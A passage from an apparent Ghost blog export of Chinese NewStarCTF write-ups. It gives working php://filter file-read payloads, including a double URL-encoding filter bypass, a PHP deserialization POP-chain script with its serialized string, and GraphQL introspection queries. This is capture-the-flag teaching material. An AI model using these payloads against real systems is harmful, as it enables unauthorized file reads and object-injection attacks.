src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116161059.png' /><!--kg-card-end: html--><pre><code>file=php://filter/NewStar/read=convert.iconv.ASCII.UCS-2BE/resource=flag.php</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116160008.png' /><!--kg-card-end: html--><pre><code>file=php://filter/NewStar/convert.iconv.utf-8.utf-7/resource=flag.php</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221116160056.png' /><!--kg-card-end: html--><p></p><blockquote>最后下班！</blockquote><p></p><p></p><p></p>",
                        "comment_id": "63739935f7e27b274c0bd8d4",
                        "plaintext": "0、使用到的知识点\n\n\n\nphp中mt_srand()、mt_rand() 方法设置随机数种子和生产随机数\n\nphp_mt_seed 工具爆破随机数种子\n\nphp://filter 伪协议读取文件\n\nphp://filter 伪协议rot13编码、url双层编码绕过读取文件\n\n1、页面代码\n\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);\necho \"Hint: \".mt_rand().\"<br>\";\nif(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){\n    if(!preg_match(\"/base|\\.\\./i\",$_GET['file']) && preg_match(\"/NewStar/i\",$_GET['file']) && isset($_GET['file'])){\n        //flag in `flag.php`\n        include($_GET['file']);\n    }else{\n        echo \"Baby Hacker?\";\n    }\n}else{\n    echo \"No Hacker!\";\n} Hint: 1219893521\nNo Hacker!\n\n2、首先根据hint的提示爆破一下随机数种子\n\n使用php_mt_seed工具，linux中进入php_mt_seed工具所在目录执行以下命令，获得种子为：1145146\n\n3、使用php的函数获得下一个随机数\n\nmt_srand(1145146)：设置随机数种子\nmt_rand()：获得第一个随机数，需要的是第二个随机数\n\n由上面的结果可以看出，第一个随机数就是题目所给提示的数字，然后第二个随机数就是我们所需要的数字\n\n4、分析一下代码\n\n<?php\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"seed.php\");\n//mt_srand(*********);\n\n// 输出第一个随机数\necho \"Hint: \".mt_rand().\"<br>\";\n\n// post请求传入一个guess参数，不能为空并且md5加密要等于下一个随机数\nif(isset($_POST['guess']) && md5($_POST['guess']) === md5(mt_rand())){\n\n\t// 参数值中不能有base，必须有NewStar\n    if(!preg_match(\"/base|\\.\\./i\",$_GET['file']) && preg_match(\"/NewStar/i\",$_GET['file']) && isset($_GET['file'])){\n    \n        //flag in `flag.php`\n        include($_GET['file']);\n    }else{\n        echo \"Baby Hacker?\";\n    }\n}else{\n    echo \"No Hacker!\";\n} Hint: 1219893521\nNo Hacker!\n\n看到include可以联想到使用伪协议，然后需要的是读取文件，可以使用：filter协议读取，因为过滤base所以不能使用base64编码读取文件，可以使用rot13编码读取，\n\n那么file的参数值为：file=php://filter/read=string.rot13/newstar/resource=flag.php\n因为必须包含NewStar，所以最终结果为：\nfile=php://filter/NewStar/read=string.rot13/newstar/resource=flag.php\n\n查看源代码可以发现一行以rot13编码的flag，将其解码就可有得到flag\n\n5、获得flag\n\n6、强行使用base64读取文件\n\n因为正则过滤了base这四个字母，但是filter协议自带一层url解码，所以双层url编码可以绕这里的过滤\n例如：s的url编码为%73，然后在单独对：%、7、3进行一次url编码得到%25%37%33，从而绕过正则过滤\n\n这样就得到了一串以base64加密的flag，然后网上使用base64解码一下\n\n7、iconv编码方式绕过\n\nUCS-2：对目标字符串进行2位一反转\nUCS-4：对目标字符串进行4位一反转\n\nfile=php://filter/NewStar/read=convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\n\nphp://filter/NewStar/read=convert.iconv.UCS-4LE.UCS-4BE/resource=flag.php\n\nfile=php://filter/NewStar/read=convert.iconv.ASCII.UCS-2BE/resource=flag.php\n\nfile=php://filter/NewStar/convert.iconv.utf-8.utf-7/resource=flag.php\n\n\n\n最后下班！\n\n\n\n\n\n",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/31c229d21ffafacd58828cc154334559.jpg",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-15T13:50:45.000Z",
                        "updated_at": "2022-11-17T01:59:29.000Z",
                        "published_at": "2022-11-15T15:17:55.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "6374700af7e27b274c0bd9d4",
                        "uuid": "a6752395-7ce0-4f14-9049-f4d94b310d06",
                        "title": "Week2 UnserializeOne 200",
                        "slug": "unserializeone-200",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}],[\"soft-return\",\"\",{}]],\"cards\":[[\"code\",{\"code\":\"<?php\\nerror_reporting(0);\\nhighlight_file(__FILE__);\\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\\n\\n\\nclass Start{\\n    public $name;\\n    protected $func;\\n\\t\\n    // 函数销毁时执行\\n    // Start类对象销毁时执行\\n    public function __destruct()\\n    {\\n        echo \\\"Welcome to NewStarCTF, \\\".$this->name;\\n    }\\n\\n\\t// 当对不可访问属性调用isset()时调用\\n    // 访问Start类对象中不存在的属性时调用\\n    public function __isset($var)\\n    {\\n        ($this->func)();\\n    }\\n}\\n\\nclass Sec{\\n    private $obj;\\n    private $var;\\n\\n\\t// 类被当成字符串时调用\\n    // Sec类被当成字符串ecco时调用\\n    public function __toString()\\n    {\\n        $this->obj->check($this->var);\\n        return \\\"CTFers\\\";\\n    }\\n\\n\\t// 调用函数的方式调用一个对象时的回应方法\\n    // 调用Sec类对象中的一个方法时调用\\n    public function __invoke()\\n    {\\n        echo file_get_contents('/flag');\\n    }\\n}\\n\\nclass Easy{\\n    public $cla;\\n\\n\\t// 在对象中调用一个不可访问方法时调用\\n    // 调用Easy类对象中的一个不存在的方法时调用\\n    public function __call($fun, $var)\\n    {\\n        $this->cla = clone $var[0];\\n    }\\n}\\n\\nclass eeee{\\n    public $obj;\\n\\n\\t// 当对象复制完成时调用\\n    // 当eeee类对象被复制时调用\\n    public function __clone()\\n    {\\n        if(isset($this->obj->cmd)){\\n            echo \\\"success\\\";\\n        }\\n    }\\n}\\n\\nif(isset($_POST['pop'])){\\n    unserialize($_POST['pop']);\\n}\"}],[\"code\",{\"code\":\"$start = new Start();\\n$e = new eeee();\\n$easy = new Easy();\\n\\n// 存储Start类对象就阔以触发其中的__isset魔术方法\\n$e ->obj = $start;\\n\\n// 这里使用构成方法赋值，虽然原题没有但可以自己加\\n//$sec = new Sec($easy,$start);\\n\\n// 没有构成方法方式赋值\\n$sec = new Sec();\\n// 存储Easy类对象就阔以触发其中的__call魔术方法\\n$sec ->obj = $easy;\\n// 存储eeee类对象就阔以触发其中的__clone魔术方法\\n$sec ->var = $e;\\n\\n// 存储Sec类对象就阔以触发其中的__toString魔术方法\\n$start->name = $sec;\\n// 存储Sec类对象就阔以触发其中的____invoke魔术方法,获取flag\\n$start->func = $sec;\\n\\necho serialize($start);\",\"language\":\"php\"}],[\"code\",{\"code\":\"O:5:\\\"Start\\\":2:{s:4:\\\"name\\\";O:3:\\\"Sec\\\":2:{s:3:\\\"obj\\\";O:4:\\\"Easy\\\":1:{s:3:\\\"cla\\\";N;}s:3:\\\"var\\\";O:4:\\\"eeee\\\":1:{s:3:\\\"obj\\\";r:1;}}s:4:\\\"func\\\";r:2;}\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/288eb89fd17c95cb638cbdf7b5eb76c.jpg' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/f4c037fd9ef9d16049e29e28eb6340f.jpg' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117123944.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117124029.png' />\"}]],\"markups\":[],\"sections\":[[1,\"h4\",[[0,[],0,\"0、知识点与工具\"]]],[1,\"blockquote\",[[0,[],0,\"php 魔术方法\"],[1,[],0,0],[0,[],0,\"\\t\\t\\t\\t\\t__destruct()、__isset()、__construct()、__toString、\\t\\t\\t                         \"],[1,[],0,1],[0,[],0,\"\\t\\t\\t\\t\\t__invoke()、__call()、__clone()\"]]],[1,\"blockquote\",[[0,[],0,\"php 反序列化\"]]],[1,\"blockquote\",[[0,[],0,\"工具：burpsuite、postman\"]]],[1,\"h4\",[[0,[],0,\"1、分析一下代码\"]]],[10,0],[1,\"blockquote\",[[0,[],0,\"根据上面的分析，可以倒推，获取flag的invoke方法是在Sec类中，那么要触发invoke方法需要调用Sec类中的方法，\"]]],[1,\"blockquote\",[[0,[],0,\"洞观全局只有Start类中有调用对象中的方法代码，\"]]],[1,\"blockquote\",[[0,[],0,\"所以Start类中的属性func的值应该存储Sec类对象\"]]],[1,\"blockquote\",[[0,[],0,\"然后想要执行Start类中isset方法，那么需要eeee类中的属性obj存储Start类对象\"]]],[1,\"blockquote\",[[0,[],0,\"然后想要执行eeee类中clone方法，那么需要访问Easy类中一个不存在的方法\"]]],[1,\"blockquote\",[[0,[],0,\"然后想要执行call方法，那么需要执行Sec类中的toString方法\"]]],[1,\"blockquote\",[[0,[],0,\"然后想要执行toString方法，那么需要Start类对象被销毁\"]]],[1,\"blockquote\",[[0,[],0,\"最终结果为：Start类对象中 $name= Sec类对象，$func = Sec类对象\"],[1,[],0,2],[0,[],0,\"\\t\\t\\t\\t\\t\\tSec类对象中的 $obj = Easy类对象，$var = eeee类对象\"],[1,[],0,3],[0,[],0,\"\\t\\t\\t\\t\\t\\teeee类对象中的$obj = Start类对象\"],[1,[],0,4],[0,[],0,\"\\t\\t\\t\\t\\t\\tEasy类对象中的$cla = null\"]]],[1,\"blockquote\",[[0,[],0,\"把下面的代码加在题目中的最后一行，用自己的php环境跑一下就阔以得到下序列化的字符串，不过需要把最后那个if判断参数的代码干掉\"]]],[10,1],[1,\"blockquote\",[[0,[],0,\"序列化后的字符串为\"]]],[10,2],[10,3],[10,4],[1,\"blockquote\",[[0,[],0,\"看了有些人的wp，发现序列化的字符串需要url编码，但使用burp倒是并不需要url编码，编不编码并不影响结果，在这一题中\"]]],[1,\"blockquote\",[[0,[],0,\"使用postman进行测试，发现url编码后的字符串还不能获得flag，未编码的字符串倒是可以获得flag\"]]],[10,5],[10,6],[1,\"p\",[]],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
                        "html": "<h4 id=\"0%E3%80%81%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%8E%E5%B7%A5%E5%85%B7\">0、知识点与工具</h4><blockquote>php 魔术方法<br>     __destruct()、__isset()、__construct()、__toString、                            <br>     __invoke()、__call()、__clone()</blockquote><blockquote>php 反序列化</blockquote><blockquote>工具：burpsuite、postman</blockquote><h4 id=\"1%E3%80%81%E5%88%86%E6%9E%90%E4%B8%80%E4%B8%8B%E4%BB%A3%E7%A0%81\">1、分析一下代码</h4><pre><code>&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\n\n\nclass Start{\n    public $name;\n    protected $func;\n\t\n    // 函数销毁时执行\n    // Start类对象销毁时执行\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this-&gt;name;\n    }\n\n\t// 当对不可访问属性调用isset()时调用\n    // 访问Start类对象中不存在的属性时调用\n    public function __isset($var)\n    {\n        ($this-&gt;func)();\n    }\n}\n\nclass Sec{\n    private $obj;\n    private $var;\n\n\t// 类被当成字符串时调用\n    // Sec类被当成字符串ecco时调用\n    public function __toString()\n    {\n        $this-&gt;obj-&gt;check($this-&gt;var);\n        return \"CTFers\";\n    }\n\n\t// 调用函数的方式调用一个对象时的回应方法\n    // 调用Sec类对象中的一个方法时调用\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n\t// 在对象中调用一个不可访问方法时调用\n    // 调用Easy类对象中的一个不存在的方法时调用\n    public function __call($fun, $var)\n    {\n        $this-&gt;cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n\n\t// 当对象复制完成时调用\n    // 当eeee类对象被复制时调用\n    public function __clone()\n    {\n        if(isset($this-&gt;obj-&gt;cmd)){\n            echo \"success\";\n        }\n    }\n}\n\nif(isset($_POST['pop'])){\n    unserialize($_POST['pop']);\n}</code></pre><blockquote>根据上面的分析，可以倒推，获取flag的invoke方法是在Sec类中，那么要触发invoke方法需要调用Sec类中的方法，</blockquote><blockquote>洞观全局只有Start类中有调用对象中的方法代码，</blockquote><blockquote>所以Start类中的属性func的值应该存储Sec类对象</blockquote><blockquote>然后想要执行Start类中isset方法，那么需要eeee类中的属性obj存储Start类对象</blockquote><blockquote>然后想要执行eeee类中clone方法，那么需要访问Easy类中一个不存在的方法</blockquote><blockquote>然后想要执行call方法，那么需要执行Sec类中的toString方法</blockquote><blockquote>然后想要执行toString方法，那么需要Start类对象被销毁</blockquote><blockquote>最终结果为：Start类对象中 $name= Sec类对象，$func = Sec类对象<br>      Sec类对象中的 $obj = Easy类对象，$var = eeee类对象<br>      eeee类对象中的$obj = Start类对象<br>      Easy类对象中的$cla = null</blockquote><blockquote>把下面的代码加在题目中的最后一行，用自己的php环境跑一下就阔以得到下序列化的字符串，不过需要把最后那个if判断参数的代码干掉</blockquote><pre><code class=\"language-php\">$start = new Start();\n$e = new eeee();\n$easy = new Easy();\n\n// 存储Start类对象就阔以触发其中的__isset魔术方法\n$e -&gt;obj = $start;\n\n// 这里使用构成方法赋值，虽然原题没有但可以自己加\n//$sec = new Sec($easy,$start);\n\n// 没有构成方法方式赋值\n$sec = new Sec();\n// 存储Easy类对象就阔以触发其中的__call魔术方法\n$sec -&gt;obj = $easy;\n// 存储eeee类对象就阔以触发其中的__clone魔术方法\n$sec -&gt;var = $e;\n\n// 存储Sec类对象就阔以触发其中的__toString魔术方法\n$start-&gt;name = $sec;\n// 存储Sec类对象就阔以触发其中的____invoke魔术方法,获取flag\n$start-&gt;func = $sec;\n\necho serialize($start);</code></pre><blockquote>序列化后的字符串为</blockquote><pre><code>O:5:\"Start\":2:{s:4:\"name\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";O:4:\"eeee\":1:{s:3:\"obj\";r:1;}}s:4:\"func\";r:2;}</code></pre><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/288eb89fd17c95cb638cbdf7b5eb76c.jpg' /><!--kg-card-end: html--><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/f4c037fd9ef9d16049e29e28eb6340f.jpg' /><!--kg-card-end: html--><blockquote>看了有些人的wp，发现序列化的字符串需要url编码，但使用burp倒是并不需要url编码，编不编码并不影响结果，在这一题中</blockquote><blockquote>使用postman进行测试，发现url编码后的字符串还不能获得flag，未编码的字符串倒是可以获得flag</blockquote><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117123944.png' /><!--kg-card-end: html--><!--kg-card-begin: html--><img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117124029.png' /><!--kg-card-end: html--><p></p>",
                        "comment_id": "6374700af7e27b274c0bd9d4",
                        "plaintext": "0、知识点与工具\n\nphp 魔术方法\n     __destruct()、__isset()、__construct()、__toString、                           \n     __invoke()、__call()、__clone()\n\nphp 反序列化\n\n工具：burpsuite、postman\n\n1、分析一下代码\n\n<?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\n\n\nclass Start{\n    public $name;\n    protected $func;\n\t\n    // 函数销毁时执行\n    // Start类对象销毁时执行\n    public function __destruct()\n    {\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    }\n\n\t// 当对不可访问属性调用isset()时调用\n    // 访问Start类对象中不存在的属性时调用\n    public function __isset($var)\n    {\n        ($this->func)();\n    }\n}\n\nclass Sec{\n    private $obj;\n    private $var;\n\n\t// 类被当成字符串时调用\n    // Sec类被当成字符串ecco时调用\n    public function __toString()\n    {\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    }\n\n\t// 调用函数的方式调用一个对象时的回应方法\n    // 调用Sec类对象中的一个方法时调用\n    public function __invoke()\n    {\n        echo file_get_contents('/flag');\n    }\n}\n\nclass Easy{\n    public $cla;\n\n\t// 在对象中调用一个不可访问方法时调用\n    // 调用Easy类对象中的一个不存在的方法时调用\n    public function __call($fun, $var)\n    {\n        $this->cla = clone $var[0];\n    }\n}\n\nclass eeee{\n    public $obj;\n\n\t// 当对象复制完成时调用\n    // 当eeee类对象被复制时调用\n    public function __clone()\n    {\n        if(isset($this->obj->cmd)){\n            echo \"success\";\n        }\n    }\n}\n\nif(isset($_POST['pop'])){\n    unserialize($_POST['pop']);\n}\n\n根据上面的分析，可以倒推，获取flag的invoke方法是在Sec类中，那么要触发invoke方法需要调用Sec类中的方法，\n\n洞观全局只有Start类中有调用对象中的方法代码，\n\n所以Start类中的属性func的值应该存储Sec类对象\n\n然后想要执行Start类中isset方法，那么需要eeee类中的属性obj存储Start类对象\n\n然后想要执行eeee类中clone方法，那么需要访问Easy类中一个不存在的方法\n\n然后想要执行call方法，那么需要执行Sec类中的toString方法\n\n然后想要执行toString方法，那么需要Start类对象被销毁\n\n最终结果为：Start类对象中 $name= Sec类对象，$func = Sec类对象\n      Sec类对象中的 $obj = Easy类对象，$var = eeee类对象\n      eeee类对象中的$obj = Start类对象\n      Easy类对象中的$cla = null\n\n把下面的代码加在题目中的最后一行，用自己的php环境跑一下就阔以得到下序列化的字符串，不过需要把最后那个if判断参数的代码干掉\n\n$start = new Start();\n$e = new eeee();\n$easy = new Easy();\n\n// 存储Start类对象就阔以触发其中的__isset魔术方法\n$e ->obj = $start;\n\n// 这里使用构成方法赋值，虽然原题没有但可以自己加\n//$sec = new Sec($easy,$start);\n\n// 没有构成方法方式赋值\n$sec = new Sec();\n// 存储Easy类对象就阔以触发其中的__call魔术方法\n$sec ->obj = $easy;\n// 存储eeee类对象就阔以触发其中的__clone魔术方法\n$sec ->var = $e;\n\n// 存储Sec类对象就阔以触发其中的__toString魔术方法\n$start->name = $sec;\n// 存储Sec类对象就阔以触发其中的____invoke魔术方法,获取flag\n$start->func = $sec;\n\necho serialize($start);\n\n序列化后的字符串为\n\nO:5:\"Start\":2:{s:4:\"name\";O:3:\"Sec\":2:{s:3:\"obj\";O:4:\"Easy\":1:{s:3:\"cla\";N;}s:3:\"var\";O:4:\"eeee\":1:{s:3:\"obj\";r:1;}}s:4:\"func\";r:2;}\n\n看了有些人的wp，发现序列化的字符串需要url编码，但使用burp倒是并不需要url编码，编不编码并不影响结果，在这一题中\n\n使用postman进行测试，发现url编码后的字符串还不能获得flag，未编码的字符串倒是可以获得flag\n\n",
                        "feature_image": "__GHOST_URL__/content/images/2022/11/69bce6f54be45fc4d219573e1e0a54d5.png",
                        "featured": 0,
                        "type": "post",
                        "status": "published",
                        "locale": null,
                        "visibility": "public",
                        "email_recipient_filter": "all",
                        "created_at": "2022-11-16T05:07:22.000Z",
                        "updated_at": "2022-11-17T04:46:22.000Z",
                        "published_at": "2022-11-17T04:46:22.000Z",
                        "custom_excerpt": null,
                        "codeinjection_head": null,
                        "codeinjection_foot": null,
                        "custom_template": null,
                        "canonical_url": null,
                        "newsletter_id": null
                    },
                    {
                        "id": "6375d457f7e27b274c0bdb87",
                        "uuid": "91a55c68-da43-4717-ba7d-e706a7949d29",
                        "title": "Week2 ezAPI 200",
                        "slug": "week2",
                        "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117142929.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117143243.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/U%60D)%609@%60313JIF8(~C~E2JB.png' />\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/7WBHY%7BB$$RP7%7B%60%7B2FLN%5B9%606.png' />\"}],[\"code\",{\"code\":\"<?php\\n    error_reporting(0);\\n\\n    // 传入参数id\\n    $id = $_POST['id'];\\n\\n\\n    // $str = $id\\n    // 对id进行过滤，id中必须含有数字，非数字部分会被替换为空\\n    function waf($str)\\n    {\\n        if (!is_numeric($str) || preg_replace(\\\"/[0-9]/\\\", \\\"\\\", $str) !== \\\"\\\") {\\n            return False;\\n        } else {\\n            return True;\\n        }\\n    }\\n\\n    // 发送查询的数据并返回结果\\n    function send($data)\\n    {\\n        $options = array(\\n            'http' => array(\\n                'method' => 'POST',\\n                'header' => 'Content-type: application/json',\\n                'content' => $data,\\n                'timeout' => 10 * 60\\n            )\\n        );\\n\\n        $context = stream_context_create($options);\\n        $result = file_get_contents(\\\"http://graphql:8080/v1/graphql\\\", false, $context);\\n        return $result;\\n    }\\n\\n    // 首先判断id是否为空\\n    if (isset($id)) {\\n\\n        // id进行waf过滤\\n        if (waf($id)) {\\n\\n            // 需要在传入一个参数data, 会根据data是否为空执行代码\\n            // 如果data不为空，使用data的值，为空使用默认的值\\n                /**\\n                * '{\\n                *       \\\"query\\\":\\\"query{\\n                *           users_user_by_pk(id:' . $id . ') {\\n                *                name\\n                *           }\\n                *        }\\\", \\n                *        \\\"variables\\\":null\\n                *  }';\\n                * \\n                * \\n                */\\n            isset($_POST['data']) ? $data = $_POST['data'] : $data = '{\\\"query\\\":\\\"query{\\\\nusers_user_by_pk(id:' . $id . ') {\\\\nname\\\\n}\\\\n}\\\\n\\\", \\\"variables\\\":null}';\\n\\n            // 接收结果并将结果对JSON格式的字符串进行解码\\n            $res = json_decode(send($data));\\n\\n            // 查询结果中的name不为空就将其展示到页面上，否则输出找不到\\n            if ($res->data->users_user_by_pk->name !== NULL) {\\n                echo \\\"ID: \\\" . $id . \\\"<br>Name: \\\" . $res->data->users_user_by_pk->name;\\n            } else {\\n                echo \\\"<b>Can't found it!</b><br><br>DEBUG: \\\";\\n                var_dump($res->data);\\n            }\\n        } else {\\n            die(\\\"<b>Hacker! Only Number!</b>\\\");\\n        }\\n    } else {\\n        die(\\\"<b>No Data?</b>\\\");\\n    }\\n?>\\n\",\"language\":\"php\"}],[\"code\",{\"code\":\"{\\\"query\\\":\\\"\\\\n    query IntrospectionQuery {\\\\r\\\\n      __schema {\\\\r\\\\n        queryType { name }\\\\r\\\\n        mutationType { name }\\\\r\\\\n        subscriptionType { name }\\\\r\\\\n        types {\\\\r\\\\n          ...FullType\\\\r\\\\n        }\\\\r\\\\n        directives {\\\\r\\\\n          name\\\\r\\\\n          description\\\\r\\\\n          locations\\\\r\\\\n          args {\\\\r\\\\n            ...InputValue\\\\r\\\\n          }\\\\r\\\\n        }\\\\r\\\\n      }\\\\r\\\\n    }\\\\r\\\\n\\\\r\\\\n    fragment FullType on __Type {\\\\r\\\\n      kind\\\\r\\\\n      name\\\\r\\\\n      description\\\\r\\\\n      fields(includeDeprecated: true) {\\\\r\\\\n        name\\\\r\\\\n        description\\\\r\\\\n        args {\\\\r\\\\n          ...InputValue\\\\r\\\\n        }\\\\r\\\\n        type {\\\\r\\\\n          ...TypeRef\\\\r\\\\n        }\\\\r\\\\n        isDeprecated\\\\r\\\\n        deprecationReason\\\\r\\\\n      }\\\\r\\\\n      inputFields {\\\\r\\\\n        ...InputValue\\\\r\\\\n      }\\\\r\\\\n      interfaces {\\\\r\\\\n        ...TypeRef\\\\r\\\\n      }\\\\r\\\\n      enumValues(includeDeprecated: true) {\\\\r\\\\n        name\\\\r\\\\n        description\\\\r\\\\n        isDeprecated\\\\r\\\\n        deprecationReason\\\\r\\\\n      }\\\\r\\\\n      possibleTypes {\\\\r\\\\n        ...TypeRef\\\\r\\\\n      }\\\\r\\\\n    }\\\\r\\\\n\\\\r\\\\n    fragment InputValue on __InputValue {\\\\r\\\\n      name\\\\r\\\\n      description\\\\r\\\\n      type { ...TypeRef }\\\\r\\\\n      defaultValue\\\\r\\\\n    }\\\\r\\\\n\\\\r\\\\n    fragment TypeRef on __Type {\\\\r\\\\n      kind\\\\r\\\\n      name\\\\r\\\\n      ofType {\\\\r\\\\n        kind\\\\r\\\\n        name\\\\r\\\\n        ofType {\\\\r\\\\n          kind\\\\r\\\\n          name\\\\r\\\\n          ofType {\\\\r\\\\n            kind\\\\r\\\\n            name\\\\r\\\\n            ofType {\\\\r\\\\n              kind\\\\r\\\\n              name\\\\r\\\\n              ofType {\\\\r\\\\n                kind\\\\r\\\\n                name\\\\r\\\\n                ofType {\\\\r\\\\n                  kind\\\\r\\\\n                  name\\\\r\\\\n                  ofType {\\\\r\\\\n                    kind\\\\r\\\\n                    name\\\\r\\\\n                  }\\\\r\\\\n                }\\\\r\\\\n              }\\\\r\\\\n            }\\\\r\\\\n          }\\\\r\\\\n        }\\\\r\\\\n      }\\\\r\\\\n    }\\\\r\\\\n  \\\",\\\"variables\\\":null}\\n\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117161755.png' />\"}],[\"code\",{\"code\":\"{\\\"query\\\":\\\"query{\\\\nffffllllaaagggg_1n_h3r3_flag{\\\\nflag\\\\n}\\\\n}\\\\n\\\", \\\"variables\\\":null}\\n\\n// 直观点查看\\n{\\n\\t\\\"query\\\":\\\"query{\\n    \\t\\tffffllllaaagggg_1n_h3r3_flag{\\n            \\tflag\\n            }\\n    \\t}\\\",\\n    \\\"variables\\\":null\\n}\"}],[\"html\",{\"html\":\"<img src='https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117162630.png' />\"}],[\"bookmark\",{\"url\":\"https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ\",\"metadata\":{\"url\":\"http://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&mid=2247488470&idx=1&sn=969b06299023be79dd04703a0bb0fd47&chksm=9b393567ac4ebc71d70552f05b5d29c9c3e70adb1d4dc9ef5968f44f9160d088bf9f49aee80c#rd\",\"title\":\"玩转graphQL\",\"description\":\"这是酒仙桥六号部队的第118篇文章-玩转graphQL。全文共计4257个字，预计阅读时长12分钟。\",\"author\":\"先锋情报站\",\"publisher\":\"微信公众平台\",\"thumbnail\":\"http://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s54B52X8UPybZgzLeupG5ic16ibqicJicrq3dpBdZunVJWrxHsbNG53Eyiaiaibh6p2b523z6Jvpu8KTtaPTw/0?wx_fmt=jpeg\",\"icon\":\"https://res.wx.qq.com/a/wx_fed/assets/res/OTE0YTAw.png\"}}]],\"markups\":[],\"sections\":[[1,\"h4\",[[0,[],0,\"0、知识点与工具\"]]],[1,\"blockquote\",[[0,[],0,\"graphql 查询\"]]],[1,\"blockquote\",[[0,[],0,\"目录扫描工具：御剑\"]]],[1,\"p\",[]],[1,\"h4\",[[0,[],0,\"1、页面情况\"]]],[10,0],[1,\"blockquote\",[[0,[],0,\"页面很简洁就一个输入框，可以输入用户的id\"]]],[1,\"blockquote\",[[0,[],0,\"测试后发现用户id的范围为：1~6，超出这个范围会返回这个信息\"]]],[10,1],[1,\"h5\",[[0,[],0,\"查看源代码，发现一条“提示信息？”，看不懂\"]]],[10,2],[1,\"h4\",[[0,[],0,\"2、使用御剑扫描一下网址目录\"]]],[10,3],[1,\"blockquote\",[[0,[],0,\"访问下载www.zip\"]]],[1,\"h4\",[[0,[],0,\"3、分析其中的php代码\"]]],[10,4],[1,\"blockquote\",[[0,[],0,\"关于graphql查询，有一种查询方式可以查询所有该API端点的所有信息\"]]],[10,5],[1,\"blockquote\",[[0,[],0,\"然后将上面这个放入data中，然后去执行就会返回所有信息，然后在返回信息中搜索一下flag\"]]],[10,6],[1,\"blockquote\",[[0,[],0,\"这样就找到flag所在的类的名称：ffffllllaaagggg_1n_h3r3_flag\"]]],[1,\"blockquote\",[[0,[],0,\"然后在构造data查询\"]]],[10,7],[1,\"h4\",[[0,[],0,\"4、结果\"]]],[10,8],[1,\"blockquote\",[[0,[],0,\"关于graphql的资料可以看看这个\"]]],[10,9],[1,\"p\",[]]],\"ghostVersion\":\"4.0\"}",
                        "lexical": null,
